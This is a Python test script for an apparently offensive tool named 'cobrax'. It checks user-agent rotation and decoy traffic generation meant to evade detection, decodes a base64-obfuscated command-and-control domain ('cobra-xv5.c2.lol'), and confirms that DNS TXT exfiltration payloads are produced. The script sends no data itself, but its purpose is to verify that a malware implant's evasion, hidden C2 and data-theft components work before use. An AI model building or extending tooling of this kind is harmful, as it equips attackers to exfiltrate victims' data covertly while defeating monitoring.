import sys
import os

# Ensure we can import the module
sys.path.append(os.getcwd())

try:
    from cobrax.core import UserAgentRotator, NoiseEngine, DNSExfiltrator, C2_ENCODED
    import base64
    print("[+] Import Successful")
except ImportError as e:
    print(f"[-] Import Failed: {e}")
    sys.exit(1)

def test_ua_rotation():
    print("[*] Testing User-Agent Rotation...")
    uas = set()
    for _ in range(50):
        uas.add(UserAgentRotator.get_random())
    
    if len(uas) < 5:
        print(f"[-] Low entropy in UA rotation! Only {len(uas)} unique agents.")
        sys.exit(1)
    print(f"[+] Verified {len(uas)} unique User-Agents generated.")

def test_noise_engine():
    print("[*] Testing Noise Engine...")
    paths = NoiseEngine.generate_noise_paths("https://example.com")
    if len(paths) != 4:
        print(f"[-] Noise Ratio Incorrect: Got {len(paths)}, expected 4.")
        sys.exit(1)
    print(f"[+] Noise Logic Verified (Paths: {len(paths)})")

def test_c2_deobfuscation():
    print("[*] Testing C2 Obfuscation...")
    decoded = base64.b64decode(C2_ENCODED).decode()
    if "cobra-xv5.c2.lol" not in decoded:
        print(f"[-] C2 Decoding Failed. Got: {decoded}")
        sys.exit(1)
    try:
        payloads = DNSExfiltrator.generate_dns_payload("test")
        print(f"[+] DNS Payload Generation: OK ({payloads['TXT'][:20]}...)")
    except Exception as e:
        print(f"[-] DNS Payload Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    test_ua_rotation()
    test_noise_engine()
    test_c2_deobfuscation()
    print("\n[SUCCESS] ALL SYSTEMS NOMINAL")
